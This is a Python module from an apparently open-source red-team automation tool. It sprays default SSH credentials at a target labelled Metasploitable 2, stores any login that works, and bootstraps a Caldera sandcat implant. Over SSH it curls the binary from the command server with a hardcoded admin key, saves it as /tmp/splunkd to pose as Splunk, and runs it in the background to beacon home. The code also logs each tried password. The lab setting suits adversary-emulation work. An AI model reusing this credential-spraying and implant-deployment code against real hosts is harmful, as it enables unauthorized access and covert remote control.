# Copyright 2026 Athena Contributors
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""InitialAccessEngine — SSH credential testing and Caldera agent bootstrapping."""

import asyncio
import logging
import uuid
from datetime import datetime, timezone

import aiosqlite

from app.config import settings
from app.models.recon import InitialAccessResult
from app.ws_manager import ws_manager

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Default credentials targeting Metasploitable 2
# ---------------------------------------------------------------------------
_DEFAULT_CREDS: list[tuple[str, str]] = [
    ("msfadmin", "msfadmin"),
    ("root", "toor"),
    ("admin", "admin"),
    ("user", "user"),
]


class InitialAccessEngine:
    """SSH-based initial access phase: credential spraying + agent bootstrapping."""

    async def try_ssh_login(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        ip: str,
        port: int = 22,
    ) -> InitialAccessResult:
        """Attempt SSH login using the default credential list.

        In mock mode a successful result is returned immediately without any
        real network connection.  In real mode every credential in
        ``_DEFAULT_CREDS`` is tried in order; the first success is returned.
        A credential fact is written to the DB on success regardless of mode.
        """
        if settings.MOCK_CALDERA:
            return await self._mock_ssh_result(
                db=db,
                operation_id=operation_id,
                target_id=target_id,
                ip=ip,
                port=port,
            )

        return await self._real_ssh_login(
            db=db,
            operation_id=operation_id,
            target_id=target_id,
            ip=ip,
            port=port,
        )

    # ------------------------------------------------------------------
    # Public helper — Caldera agent bootstrapping (real mode only)
    # ------------------------------------------------------------------

    async def bootstrap_caldera_agent(
        self,
        ip: str,
        credential: tuple[str, str],
        caldera_host: str,
    ) -> bool:
        """Deploy and start a Caldera sandcat agent on the remote host via SSH.

        Parameters
        ----------
        ip:
            Target IP address.
        credential:
            ``(username, password)`` tuple.
        caldera_host:
            Full ``scheme://host:port`` of the Caldera server, e.g.
            ``http://172.17.0.1:58888``.

        Returns ``True`` when the remote commands execute without error and the
        30-second beacon window has elapsed.  Returns ``False`` on any
        exception.
        """
        try:
            import asyncssh  # deferred import — not available in all envs

            username, password = credential
            async with await asyncssh.connect(
                ip,
                username=username,
                password=password,
                known_hosts=None,
            ) as conn:
                # Download sandcat binary
                await conn.run(
                    f"curl -s -X POST {caldera_host}/file/download"
                    f' -H "platform: linux"'
                    f' -H "file: sandcat.go-linux"'
                    f' -H "Authorization: ADMIN123456"'
                    f" -o /tmp/splunkd",
                    check=True,
                )
                # Make executable
                await conn.run("chmod +x /tmp/splunkd", check=True)
                # Launch agent in background
                await conn.run(
                    f"nohup /tmp/splunkd -server {caldera_host} -group red &",
                    check=True,
                )

            # Wait for agent to beacon home
            await asyncio.sleep(30)
            return True

        except Exception:
            logger.exception(
                "bootstrap_caldera_agent failed for %s", ip
            )
            return False

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    async def _mock_ssh_result(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        ip: str,
        port: int,
    ) -> InitialAccessResult:
        """Return a deterministic mock success without any real network I/O."""
        cred_str = f"msfadmin:msfadmin@{ip}:{port}"
        await self._write_credential_fact(
            db=db,
            operation_id=operation_id,
            target_id=target_id,
            cred_value=cred_str,
        )
        return InitialAccessResult(
            success=True,
            method="ssh_credential",
            credential="msfadmin:msfadmin",
            agent_deployed=False,
            error=None,
        )

    async def _real_ssh_login(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        ip: str,
        port: int,
    ) -> InitialAccessResult:
        """Try each entry in ``_DEFAULT_CREDS`` via asyncssh."""
        import asyncssh  # deferred import

        for username, password in _DEFAULT_CREDS:
            try:
                logger.debug(
                    "Trying SSH %s@%s:%s with password %s",
                    username, ip, port, password,
                )
                async with await asyncssh.connect(
                    ip,
                    port=port,
                    username=username,
                    password=password,
                    known_hosts=None,
                ):
                    # Connection succeeded — record the credential
                    cred_str = f"{username}:{password}@{ip}:{port}"
                    await self._write_credential_fact(
                        db=db,
                        operation_id=operation_id,
                        target_id=target_id,
                        cred_value=cred_str,
                    )
                    logger.info(
                        "SSH login succeeded for %s@%s:%s", username, ip, port
                    )
                    return InitialAccessResult(
                        success=True,
                        method="ssh_credential",
                        credential=f"{username}:{password}",
                        agent_deployed=False,
                        error=None,
                    )
            except (asyncssh.Error, OSError):
                logger.debug(
                    "SSH login failed for %s@%s:%s", username, ip, port
                )
                continue

        logger.warning("All SSH credentials failed for %s:%s", ip, port)
        return InitialAccessResult(
            success=False,
            method="none",
            credential=None,
            agent_deployed=False,
            error="All credentials failed",
        )

    async def _write_credential_fact(
        self,
        db: aiosqlite.Connection,
        operation_id: str,
        target_id: str,
        cred_value: str,
    ) -> None:
        """Insert a credential fact into the facts table and broadcast it."""
        fact_id = str(uuid.uuid4())
        now = datetime.now(timezone.utc).isoformat()

        await db.execute(
            "INSERT INTO facts "
            "(id, trait, value, category, source_technique_id, "
            "source_target_id, operation_id, score, collected_at) "
            "VALUES (?, ?, ?, ?, NULL, ?, ?, 1, ?)",
            (
                fact_id,
                "credential.ssh",
                cred_value,
                "credential",
                target_id,
                operation_id,
                now,
            ),
        )
        await db.commit()

        fact_payload = {
            "id": fact_id,
            "trait": "credential.ssh",
            "value": cred_value,
            "category": "credential",
            "source_target_id": target_id,
            "operation_id": operation_id,
        }
        await ws_manager.broadcast(operation_id, "fact.new", fact_payload)
